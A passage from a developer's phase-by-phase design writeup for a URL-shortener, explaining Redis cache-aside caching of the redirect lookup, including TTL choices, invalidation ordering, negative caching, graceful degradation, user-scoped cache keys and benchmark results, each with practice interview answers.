so a production version of this would need retention limits, consent
handling for regulated visitors, and a real answer for how (or whether)
IP gets involved once geolocation is added — none of which this phase
builds, along with rate limiting on the password-unlock endpoint, which
is an explicitly open gap until Phase 11.

---

## Phase 8: Caching the Redirect Path

### What makes data worth caching — and what in this app isn't

**What it is.** A cache trades a slower, authoritative read (Postgres) for
a faster, secondary copy (Redis) that can go stale. That trade is only
worth making for data that's read far more often than it changes, and
where a bounded amount of staleness is tolerable.

**Why it exists in this project.** `getLinkByShortCode` (Phase 7) is read
on literally every visit to a short link, but a given link's row changes
rarely — only on an owner's `PATCH`/`DELETE`, which is a low-frequency,
authenticated, low-volume operation compared to public redirect traffic.
That read-to-write ratio is what makes it a good caching candidate at all.

**How it works mechanically.** Not every field on that row is equally
cacheable, which is the whole reason Phase 8 exists as a design problem and
not just a mechanical "wrap it in Redis" exercise:

- `destination_url`, `password_hash`, `expires_at`, `is_active` — change
  only via an explicit owner action, invalidated explicitly on write (see
  "Invalidation ordering" below). Good caching candidates.
- `click_count` — changes on *every single click*, with no invalidation
  hook at all (see "The click_count problem" below). A bad caching
  candidate in the naive sense; this phase caches it anyway but bounds the
  damage with a much shorter TTL specifically because of this.
- Anything scoped to a user (e.g. a future cache of `listLinks`'s results)
  is a different category again — see "Key namespacing" below.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`getLinkByShortCode` and its private `getCachedLink`/`setCachedLink`/
`setCachedMiss`/`invalidateLinkCache` helpers.

**Common pitfalls.**

- Caching a whole row indiscriminately because "it's one query" without
  asking whether every field on it has the same staleness tolerance —
  `click_count` inside `RedirectLink` is exactly this trap, and is the
  reason this phase can't just be "cache the SELECT."
- Assuming a low read-to-write ratio disqualifies something from caching
  entirely, rather than asking whether a *shorter* TTL still captures most
  of the benefit — see the click_count decision below.

**Production considerations.** As the app grows, other read-heavy,
write-light data becomes a candidate the same way — e.g. a future
`GET /api/links/:id` cache, which would need the user-scoping rule below
applied from day one, not retrofitted after a leak.

**Interview answer.** I picked `getLinkByShortCode` to cache because it's
read on every redirect but written only on an owner's occasional edit — a
large read-to-write ratio is the basic precondition for caching being
worth it at all. But not every field on that row shares that property:
`click_count` changes on every click, so I treated it as a separate
sub-problem rather than assuming the whole row was equally safe to cache.

---

### Cache-aside, step by step

**What it is.** Cache-aside (also called lazy loading) is a pattern where
the application, not the cache, owns the read/write logic: on a read, check
the cache first; on a miss, read the source of truth and populate the
cache; on a write, update the source of truth and then evict (or update)
the cache entry.

**Why it exists in this project.** Three other patterns exist and each
implies infrastructure this project doesn't have:

- **Read-through** — the cache itself, not the application, knows how to
  load from the source of truth on a miss (e.g. via a configured loader).
  This needs a caching layer that can talk to Postgres on its own; plain
  Redis can't, and standing up something that can (e.g. a caching proxy)
  would be infrastructure with no other use here.
- **Write-through** — every write goes to the cache first, which
  synchronously writes through to the source of truth. This makes the
  cache sit *in front of* Postgres for writes, adding Redis to the
  critical path of every `PATCH`/`DELETE` even though those are already
  low-volume and not latency-sensitive — no benefit to justify the added
  dependency on that path.
- **Write-behind** — writes go to the cache and are asynchronously flushed
  to the source of truth later. This trades durability (a crash between
  the cache write and the flush loses data) for write latency, which isn't
  a problem this app has — `updateLink`/`deleteLink` are already fast,
  low-volume, single-row writes.

Cache-aside is the only one of the four that adds Redis purely as an
optional accelerant on the read path, with Postgres remaining fully
authoritative and reachable independent of Redis — which is exactly the
"graceful degradation" property this phase requires (see below).

**How it works mechanically.** `getLinkByShortCode`:

1. `getCachedLink(shortCode)` — GET `link:<shortCode>`. A hit (positive or
   negative-sentinel) returns immediately, no Postgres involved.
2. On a miss, `SELECT ... FROM links WHERE short_code = $1` against
   Postgres, same query as before this phase.
3. The result (found or not) is written back to Redis with an appropriate
   TTL, so the *next* read is a cache hit.
4. `updateLink`/`deleteLink`/`createLink`'s custom-alias branch explicitly
   evict the entry on a write, rather than waiting for the TTL (see
   "Invalidation ordering" below) — the "aside" part of cache-aside: the
   application manages invalidation itself, the cache is otherwise passive.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`getLinkByShortCode` (the read path), `updateLink`/`deleteLink`/`createLink`
(the write paths that call `invalidateLinkCache`).

**Common pitfalls.**

- Reaching for read-through/write-through by default because they sound
  more "automatic" — both require infrastructure (a smart cache or a
  cache sitting in the write path) this app has no other reason to run.
- Forgetting that cache-aside puts invalidation correctness entirely on
  the application — unlike write-through, nothing enforces that a write
  and a cache update happen together; that discipline has to be built in
  by hand (see "Invalidation ordering").

**Production considerations.** At much higher write volume, write-through
or write-behind's tradeoffs (added write latency vs. eventual durability)
start to matter more — neither applies today given how infrequent
`PATCH`/`DELETE` are relative to redirect traffic.

**Interview answer.** I used cache-aside because it's the only one of the
four core caching patterns that keeps Redis purely optional on the read
path — Postgres stays fully authoritative and reachable with Redis
completely absent, which is what let me build graceful degradation as a
first-class requirement rather than an afterthought. Read-through and
write-through both need Redis to sit *in* a critical path (a smart loader,
or the write path itself); write-behind trades durability for write
latency this app doesn't need, since writes here are already fast and rare.

---

### The click_count problem

**What it is.** `links.click_count` is a denormalized counter (Phase 7)
incremented by `recordClick` on every single redirect. `deadStateError`
compares it against `max_clicks` to decide whether a link has hit its
limit. Caching `RedirectLink` naively would cache this value too — but
nothing re-populates the cache when `recordClick` increments it, so a
cached `click_count` is frozen for the entire life of its TTL.

**Why it exists in this project.** Four options were on the table, with
very different worst-case behavior:

| Option | Worst-case overshoot past `maxClicks` | Caching benefit for capped links |
|---|---|---|
| (a) never cache `click_count`; read it separately from Postgres on every request | none | none — still a DB read every request |
| (b) cache the whole row with the normal 300s TTL | unbounded by however much traffic arrives within 300s | full |
| (c) never cache links that have `maxClicks` set at all | none | none |
| (d) cache capped links too, but with a much shorter TTL | bounded by however much traffic arrives within that short TTL | most of it |

(c) was the first instinct — exclude the risky case entirely — but it's
the wrong trade: a link only *has* a click cap because its owner expects
meaningful volume, so (c) excludes from caching exactly the links most
likely to be hot. (d) was chosen instead: capped links are cached like any
other link, but with `LINK_CACHE_CAPPED_TTL_SECONDS = 5` instead of the
usual 300. This isn't really a "concurrency race" — it's structural: a
cache entry is always written with the `click_count` read *before* that
same request's own `recordClick` call runs, so even a single next request
landing within the 5s window sees a value that doesn't yet reflect the
request(s) already served since. A 5-second window bounds that overshoot
to "however many clicks arrive in 5 seconds" instead of "however many
arrive in 5 minutes" — for all but the most viral links, a handful of
clicks at worst, self-correcting on the very next cache miss.

**How it works mechanically.** `getLinkByShortCode` picks the TTL based on
`link.maxClicks === null ? LINK_CACHE_TTL_SECONDS : LINK_CACHE_CAPPED_TTL_SECONDS`
right before caching a positive result. Nothing else about the code path
differs — `deadStateError` in `src/routes/redirect.ts` evaluates whatever
`RedirectLink` it's handed exactly the same way whether it came from
Postgres or Redis; it has no idea caching exists.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`LINK_CACHE_CAPPED_TTL_SECONDS`, and the TTL-selection line inside
`getLinkByShortCode`. Proven directly in
`tests/routes/redirect.test.ts`, `describe('response caching (Redis)')` —
one test asserts the capped TTL via `redis.ttl`, another walks through the
accepted one-request overshoot and its self-correction after the TTL
expires. The original Phase 7 test
(`'returns 410 once click_count reaches maxClicks'`) was updated to wait
out the capped TTL before asserting 410, since it previously encoded a
stricter immediate-enforcement guarantee that caching deliberately no
longer makes.

**Common pitfalls.**

- Treating "cache it or don't" as a binary choice — the actually useful
  lever here was the TTL, not the yes/no decision.
- Assuming the overshoot is a concurrency bug to be "fixed" with locking —
  it's a deliberate, bounded, and self-correcting tradeoff, not a defect.

**Production considerations.** **What would flip this back to option
(a):** if a click cap ever acquires billing or legal significance — a paid
tier enforced by click count, or a contractual "this link stops working at
exactly N clicks" guarantee — a few seconds of possible overshoot stops
being acceptable. At that point `click_count` should go back to an
uncached, per-request Postgres read for capped links specifically (or move
enforcement server-side into an atomic Redis counter/Lua script rather
than a lazy read at all). Today it's a display/soft-limit counter with no
such stakes.

**Interview answer.** The core tension is that `click_count` changes on
every request but nothing invalidates its cache entry when that happens —
so any cached value is stale the instant it's written. My first instinct
was to just never cache links with a click cap, but that's backwards:
those are exactly the links most likely to get real traffic, since an
owner only sets a cap when they expect volume. Instead I cache them with a
5-second TTL instead of the normal 5 minutes, which bounds the possible
overshoot to "clicks that arrive in 5 seconds" rather than an open-ended
window, while still capturing most of the caching benefit. If click
enforcement ever became a hard boundary — billing, contractual limits — I'd
go back to an uncached read for that specific case, because a few seconds
of slack stops being acceptable once real stakes are attached to it.

---

### Invalidation ordering: write, then invalidate

**What it is.** When a write and a cache invalidation both need to happen,
there are two possible orderings — invalidate the cache first, then write
the database; or write the database first, then invalidate the cache —
and they are not equivalent.

**Why it exists in this project.** `updateLink`/`deleteLink` both write to
Postgres and need `link:<shortCode>` gone from Redis afterward.
Invalidate-then-write has a real race: a concurrent `GET /:shortCode`
landing between the delete and the write finds no cache entry, reads
Postgres (still the *old* value, since the write hasn't landed yet), and
re-populates the cache with that old value — and nothing will ever
invalidate it again until its own TTL expires naturally. That's strictly
worse than doing nothing: a stale entry that outlives the very fix meant
to remove it. Write-then-invalidate's race window is bounded instead: a
concurrent read landing between the write and the delete gets one stale
response, and the very next request after the delete completes is
guaranteed fresh.

**How it works mechanically.** `updateLink` runs its `UPDATE ... RETURNING`
first, then calls `invalidateLinkCache(row.short_code)` before building
and returning the `Link`. `deleteLink` runs `DELETE ... RETURNING id,
short_code` first, then invalidates using the returned `short_code` before
returning `true`. Both invalidate unconditionally, even for a link that
was never cached (a capped link, say) — a `DEL` on an absent key is a
harmless no-op, simpler than branching on whether caching would have
applied.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`updateLink`, `deleteLink`, and `invalidateLinkCache`'s doc comment, which
spells out the race being avoided. Proven in
`tests/routes/redirect.test.ts`: the PATCH/DELETE invalidation tests
assert `redis.get` is `null` *immediately* after the write, not just that
a later request happens to see fresh data.

**Common pitfalls.**

- Invalidating before the write "to be safe" — this is the exact ordering
  that produces a permanently stale entry under a concurrent read, not a
  safer one.
- Assuming the race is purely theoretical — it only requires one read to
  land in a narrow window between two Redis/Postgres calls under real
  concurrent traffic, which this app's own redirect volume is specifically
  expected to have.

**Production considerations.** At higher write concurrency on the *same*
link (multiple simultaneous edits), the invalidation call itself is still
just a `DEL` — idempotent and order-independent between concurrent
writers, so this doesn't need additional locking even then.

**Interview answer.** I invalidate after the database write commits, never
before, because invalidate-then-write has a race that leaves a stale cache
entry with no way to ever get fixed: a concurrent read can slip in between
the delete and the write, see the old data in Postgres, and re-cache it —
at which point nothing will invalidate that entry again until its TTL
expires on its own. Write-then-invalidate has a race too, but a strictly
smaller one: a read in that narrow window gets one stale response, and the
very next request is guaranteed correct once the delete lands.

---

### TTL as a safety net, not the primary mechanism

**What it is.** This cache has two invalidation mechanisms doing different
jobs: explicit `DEL` calls on every write (the primary mechanism, correct
immediately), and a TTL on every entry (a fallback that bounds staleness
even when explicit invalidation doesn't happen).

**Why it exists in this project.** Explicit invalidation can fail to run:
`invalidateLinkCache`'s own `DEL` can fail if Redis is unreachable at the
exact moment of a `PATCH`/`DELETE` (see "Graceful degradation" below,
which requires that failure not fail the request). If that happens, the
stale entry left behind has no other trigger to remove it — except its
TTL. The TTL isn't there to make invalidation unnecessary; it's there to
guarantee an upper bound on staleness even in the case explicit
invalidation was designed to handle but couldn't, for a reason outside the
application's control.

**How it works mechanically.** Every `SET` in this cache carries an `EX`
TTL — 300s for uncapped links, 5s for capped links, 30s for negative
entries. `invalidateLinkCache`'s `catch` block logs
`'Redis DEL failed while invalidating link cache; stale entry may persist
until TTL expiry'` specifically so a Redis outage during an edit is
diagnosable after the fact, even though the request itself succeeded.

**Where it lives in the codebase.** `src/services/linkService.ts` — every
`redis.set(...)` call includes an `EX` argument; `invalidateLinkCache`'s
catch block and its accompanying comment.

**Common pitfalls.**

- Treating a long TTL as an acceptable substitute for explicit
  invalidation because "it'll expire eventually" — the whole point of
  building invalidation was to make edits visible immediately, not to make
  a long staleness window tolerable.
- Forgetting to log a failed invalidation, which would make a rare "why is
  this link still showing the old destination" report undiagnosable.

**Production considerations.** If Redis outages during writes become
frequent enough that TTL-bounded staleness starts mattering operationally,
that's a signal to page on the `'Redis DEL failed...'` log line
specifically, rather than to shorten every TTL globally.

**Interview answer.** Explicit invalidation is what makes edits visible
immediately — that's the part users actually experience. The TTL exists
for the case explicit invalidation can't cover: if Redis itself is down at
the exact moment of an edit, the `DEL` call fails, gets logged, and the
request still succeeds (it must — see graceful degradation) — but that
leaves a stale entry with nothing else to clean it up except its TTL. So
the TTL isn't a substitute for invalidation, it's the bound on how bad
things get on the specific path where invalidation itself failed.

---

### Negative caching

**What it is.** Caching the *absence* of a resource — a nonexistent short
code — so a repeated lookup for the same missing key doesn't hit Postgres
every time either.

**Why it exists in this project.** `GET /:shortCode` is a public,
unauthenticated route reachable by anyone, including automated scanners
enumerating or guessing short codes. Without negative caching, every
single guess — valid or not — costs a Postgres round trip. With it, only
the first guess for a given code does.

**How it works mechanically.** A miss is stored at the *same* key
(`link:<shortCode>`) as a hit would use, with the sentinel value
`'__MISS__'` instead of a serialized link — one `GET` distinguishes all
three states (absent from cache / negative hit / positive hit) with no
second key or round trip. Its TTL (`LINK_CACHE_NEGATIVE_TTL_SECONDS = 30`)
is deliberately much shorter than the positive TTL: it bounds how long a
short code can stay invisible if it was probed moments before being
claimed. That bound matters because nothing else invalidates a negative
entry when the code stops being "nonexistent" — `createLink` has no
inherent hook into a lookup cache it doesn't know about. The custom-alias
branch of `createLink` closes this for its own case explicitly, calling
`invalidateLinkCache(shortCode)` right after a successful insert — the
30s TTL is deliberately not the only mechanism there, just the fallback.
The generated-code path doesn't get the same treatment: with 62^7 possible
codes, a fresh random code being pre-probed within a 30-second window
before it's ever generated isn't a realistic scenario worth an extra
Redis call on every signup.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`LINK_CACHE_MISS_SENTINEL`, `setCachedMiss`, the `getCachedLink` branch
that returns `{found: true, link: null}`, and the `invalidateLinkCache`
call inside `createLink`'s custom-alias branch.

**Common pitfalls.**

- Giving negative entries the same TTL as positive ones — a nonexistent
  code is much more likely to *become* real (via creation) than an
  existing link's destination is to silently change without going through
  `PATCH`, so the tolerable staleness window is genuinely different.
- Assuming the negative-cache TTL alone is sufficient and skipping the
  `createLink` invalidation — for the realistic case (custom aliases,
  which are guessable/memorable and thus more likely to be pre-probed)
  that leaves an avoidable window of a link 404ing right after its own
  creation.

**Production considerations.** At real scale, negative caching also
meaningfully reduces the load a scanning/enumeration attempt puts on
Postgres — the *first* request for a given nonexistent code still pays a
full lookup, but a sustained scan of the same handful of codes doesn't
repeat that cost.

**Interview answer.** I cache misses too, using a sentinel value at the
same key a hit would use, so a single `GET` covers all three outcomes with
no extra round trip. The tradeoff is that a link can 404 for up to the
negative TTL if its exact code was probed right before creation — I keep
that TTL short (30s) specifically to bound that window, and for the
realistic case (a custom alias, since those are guessable) I close it
entirely by having `createLink` invalidate the negative entry the moment
the alias is actually claimed.

---

### Graceful degradation: a cache that can fail must never fail the request

**What it is.** Every Redis operation on this path — `GET`, `SET`, `DEL`
— is wrapped so an error is caught, logged, and treated as "proceed as if
the cache weren't there," never allowed to propagate and fail the
request.

**Why it exists in this project.** A cache is, by definition, an optional
accelerant over a source of truth that already works on its own. If a
caching layer's failure could fail requests that would have succeeded
without it, adding the cache would have made the system *less* reliable
than having no cache at all — trading a fast path that sometimes helps for
a new way the whole system can go down. That's the opposite of what
caching is supposed to buy.

**How it works mechanically.** `getCachedLink` catches any error from
`redis.get` and returns `{found: false}` — indistinguishable, from
`getLinkByShortCode`'s perspective, from a genuine cache miss, so
execution falls straight through to the existing Postgres query.
`setCachedLink`/`setCachedMiss` catch errors from `redis.set` and simply
don't cache that lookup — the response the caller already has is
unaffected. `invalidateLinkCache` catches errors from `redis.del` — see
"TTL as a safety net" above for what that specifically trades away. Each
catch block logs via `logger.error` so a real Redis outage is visible in
aggregate, even though no individual request fails because of it.

This is a deliberate divergence from `oauthState.ts`'s `storeState`/
`consumeState`, which do *not* catch Redis errors — and that's correct
there, not an oversight here. Redis is the actual source of truth for
OAuth state (there's no Postgres fallback for "is this CSRF token valid");
a failed state store or lookup should fail that request, because
proceeding without it would mean skipping a real security check. Here,
Redis is purely a performance layer over a Postgres query that already
returns a correct answer on its own — the two modules have genuinely
different reliability requirements, not just an inconsistent style.

**Where it lives in the codebase.** `src/services/linkService.ts` — every
`try`/`catch` inside `getCachedLink`/`setCachedLink`/`setCachedMiss`/
`invalidateLinkCache`. Proven directly in
`tests/routes/redirect.test.ts`'s `describe('response caching (Redis)')`:
three tests use `vi.spyOn(redis, 'get'|'set'|'del').mockRejectedValueOnce`
to simulate a live Redis failure on each operation and assert the request
still succeeds. Manually confirmed too: stopping the local Redis container
(`docker compose stop redis`) and issuing a redirect still returned 302.

**Common pitfalls.**

- Letting a cache-layer error propagate "because it should never happen in
  practice" — a caching layer that can silently take down an
  already-working code path on a transient network blip is a regression,
  not a resilience improvement.
- Catching the error but forgetting to log it — an unlogged Redis outage
  degrades performance invisibly, discoverable only much later via a low
  hit rate with no obvious cause.

**Production considerations.** At real scale, a sustained Redis outage
under this design degrades to "every redirect pays the full Postgres
lookup cost" — worse latency, but a fully functional system, which is the
entire point.

**Interview answer.** Every Redis call on this path is wrapped so a
failure logs and falls through to Postgres rather than failing the
request — because a cache is supposed to be optional, and a cache that can
take down an already-working code path on a transient failure would make
the system less reliable than having no cache at all. I deliberately did
this differently from the existing `oauthState.ts` module, which lets
Redis errors propagate — that's correct there because Redis *is* the
source of truth for OAuth state with no fallback, so a failure there
should fail the request. Here Redis is purely a performance layer over a
Postgres query that's already correct on its own, so the two modules have
genuinely different failure requirements.

---

### Cache stampede

**What it is.** A stampede happens when a popular cache entry expires (or
is evicted) and a burst of concurrent requests all miss at once, each
independently hitting the source of truth simultaneously — turning one
slow query into many.

**Why it exists in this project — or rather, doesn't, yet.** No stampede
mitigation (single-flight locking, probabilistic early expiration,
stale-while-revalidate) is implemented this phase. At this app's actual
scale — a single API process talking directly to a local/managed Postgres
instance that comfortably handles individual lookups — the failure mode a
stampede protects against (many *simultaneous* first-touch requests for
the *same* key, arriving in the same instant a TTL lapses) isn't a
realistic problem yet. Adding locking or coordination for a scenario that
isn't happening would be complexity with no measured benefit.

**How it works mechanically.** Nothing — a TTL expiry today just means the
next request (or requests, if several arrive close together) each
independently miss and each independently re-populate the cache with the
same value. Redundant work, but bounded and self-correcting, not a
correctness problem.

**Where it lives in the codebase.** Nowhere — this is a deliberate
non-implementation, not an oversight.

**Common pitfalls.**

- Building stampede protection preemptively "because it's a known caching
  problem" without a concrete scenario where it's actually biting — that's
  solving a problem this app doesn't have yet at the cost of real
  complexity (coordination logic, an extra failure mode of its own).

**Production considerations.** The trigger that would change this answer:
a single link receiving enough concurrent first-touch traffic within one
TTL window (a link going viral, essentially) that the redundant Postgres
reads during that burst become a measurable load problem — at that point,
a short single-flight lock (e.g. a Redis `SETNX`-based mutex around the
Postgres read) or stale-while-revalidate (serve the expiring value while
one request refreshes it in the background) would be the next step, not
before.

**Interview answer.** I didn't implement stampede protection — no
locking, no probabilistic early expiration — because at this app's actual
traffic level, many concurrent requests missing the cache for the exact
same key in the exact same instant isn't a real scenario yet; a TTL
lapsing just means a request or two redundantly re-populates the cache,
which is bounded and self-correcting. I'd revisit this the moment a single
link's traffic within one TTL window makes those redundant Postgres reads
a measurable cost, not before — building the coordination for it earlier
would be complexity without a problem to justify it.

---

### Key namespacing

**What it is.** `link:<shortCode>` follows the same flat
`<namespace>:<identifier>` convention `oauthState.ts` already established
with `oauth:state:<state>`.

**Why it exists in this project.** `getLinkByShortCode` is deliberately
the one *unscoped* lookup in `linkService.ts` (Phase 7) — there's no
authenticated user to scope it by, since the redirect route is public.
`link:<shortCode>` mirrors that: no user id in the key, because the data
behind it isn't user-scoped either.

**How it works mechanically.** `linkCacheKey(shortCode)` builds
`` `link:${shortCode}` `` — nothing else goes into the key.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`linkCacheKey` and `LINK_CACHE_PREFIX`.

**Common pitfalls — and the rule this sets up for later.** The critical
rule for *any future cache over user-owned data* is that the user id must
be part of the key, not just a filter applied after reading a shared
cache entry. Concretely: if a future phase caches `getLink(userId,
linkId)` (the owner-scoped lookup, distinct from this one) and keys it as
just `link-by-id:<linkId>` — omitting `userId` — then user A's request for
`linkId` populates a cache entry that user B's request for the *same*
`linkId` (if B ever guessed or was given that id) would also read, because
nothing about the key itself encodes whose request it was. The fix isn't
an application-level ownership check after the cache read (that's exactly
the "if-statement instead of the query" mistake this codebase's own
conventions already forbid for Postgres queries — see this file's
"Conventions" section) — it's `` `link-by-id:${userId}:${linkId}` ``, so a
cache hit is structurally impossible unless the requesting user matches
the one whose request created the entry. `link:<shortCode>` gets to skip
this because `getLinkByShortCode` itself has no owner to scope by in the
first place — this is the one deliberate exception, not the general rule.

**Production considerations.** This is the same class of bug as a missing
`WHERE user_id = $2` on a Postgres query, just relocated to Redis — and
just as serious, since a cache is exactly as capable of leaking
cross-tenant data as a database is if it isn't scoped correctly.

**Interview answer.** The redirect cache key is deliberately unscoped —
just `link:<shortCode>` — because the function it caches,
`getLinkByShortCode`, is itself the one deliberately public, unscoped
lookup in this codebase; there's no user id to include because there's no
authenticated user in the request at all. But that's specifically because
this data has no owner-scoping requirement to begin with — any *future*
cache over owner-scoped data would need the user id baked directly into
the key, not checked after the fact, for the same reason every Postgres
query in this codebase scopes ownership in the `WHERE` clause instead of
an `if` statement: a cache entry keyed without the user id is exactly as
capable of serving user A's cached data to user B as a query missing
`AND user_id = $2` is.

---

### Measuring cache effectiveness

**What it is.** Two separate measurements: raw latency (is a cache hit
actually faster than a cache miss, and by how much) and hit rate (in
steady-state traffic, how often is the cache actually being used).

**Why it exists in this project.** Building a cache without measuring it
is exactly the mistake Phase 7 avoided with `recordClick`'s benchmark —
optimizing before measuring means never actually knowing whether the
change made a meaningful difference.

**How it works mechanically.** A throwaway local script (following Phase
7's own precedent — `recordClick`'s `withTransaction` benchmark helper was
written, used once, and deleted afterward, not kept as unused
infrastructure) called `getLinkByShortCode` directly, isolating it with
`process.hrtime.bigint()` the same way `recordClick` was isolated: 300
iterations after a 20-iteration warmup, median latency, once with the
cache forcibly cleared before every call (cold — Postgres read + cache
populate every time) and once with the cache pre-populated (warm — every
call a cache hit).

**Results, against local Postgres and local Redis over loopback:**

| Path | Median latency (n=300) |
|---|---|
| Cold (cache miss: Postgres read + cache populate) | **~0.569ms** |
| Warm (cache hit: single Redis `GET`) | **~0.169ms** |

A warm lookup is roughly **3.4x faster** than a cold one locally — a
~0.4ms absolute improvement on top of Phase 7's ~1.7ms measured end-to-end
redirect baseline. That's real, but it understates the production case
significantly: `links.short_code` is already a unique, indexed column, so
the *local* Postgres lookup this replaces is already about as cheap as a
single-row indexed read gets, over near-zero loopback latency. Against a
network-attached production database (real round-trip time replacing
loopback), the Postgres side of that comparison gets meaningfully more
expensive while the Redis side — typically also network-attached, but a
simpler single-key `GET` — stays comparatively cheap; the *relative*
benefit of a cache hit should be expected to grow, not shrink, once real
network RTT is involved on both sides.

For hit rate: every cache lookup logs at debug level via `logger.debug`
with `{shortCode, cache: 'hit' | 'miss' | 'negative-hit'}` and a single
consistent message (`'Link cache lookup'`), so hit rate is derivable by
counting log lines grouped by that field in a log aggregator — no new
metrics dependency (e.g. `prom-client`) was added for this, consistent
with this project's rule against silently adding dependencies.

**Where it lives in the codebase.** The benchmark script itself was
deleted after this measurement (`scripts/benchmarkLinkCache.ts`, no longer
present) — the numbers above are the artifact that matters, not the
script. The debug logging lives in `getCachedLink` in
`src/services/linkService.ts`.

**Common pitfalls.**

- Trusting the local benchmark's absolute numbers as representative of
  production — the ratio is informative, the absolute milliseconds
  measured over loopback are not.
- Keeping a one-off benchmark script around as permanent infrastructure
  nothing else calls, rather than recording its output and deleting it.

**Production considerations.** A *low* hit rate in production logs would
mean one of a few things worth investigating in order: TTLs set too short
for actual traffic patterns (unlikely here given 300s for the common
case), traffic spread across a very large number of distinct, rarely
repeated short codes (a link-sharing pattern where most links get one or
two clicks total, in which case caching has genuinely limited headroom no
matter the TTL), or — worth checking first, since it's cheap to rule
out — Redis itself intermittently failing and silently falling back to
Postgres on every request (see "Graceful degradation" above), which would
look like a low hit rate but is actually an outage that needs fixing, not
a caching-strategy problem.

**Interview answer.** I measured cold-vs-warm latency locally the same
way Phase 7 measured `recordClick` — an isolated, throwaway benchmark, 300
iterations after warmup, median latency — and got about 0.57ms cold versus
0.17ms warm, roughly a 3.4x improvement. But I called that number out as
an underestimate of the real-world benefit: the local Postgres lookup
here is already an indexed single-row read over loopback, about as cheap
as that operation gets, so the comparison is stacked against caching
looking impressive. Against a network-attached production database, the
Postgres side gets meaningfully slower while the Redis side stays roughly
as cheap, so the relative benefit should grow, not shrink. For hit rate in
production, I didn't add a metrics library — every cache lookup logs a
consistent, structured debug line, so hit rate is derivable from log
aggregation alone, and a low hit rate would point me first at whether
Redis itself is silently failing before I'd assume it's a TTL-tuning
problem.
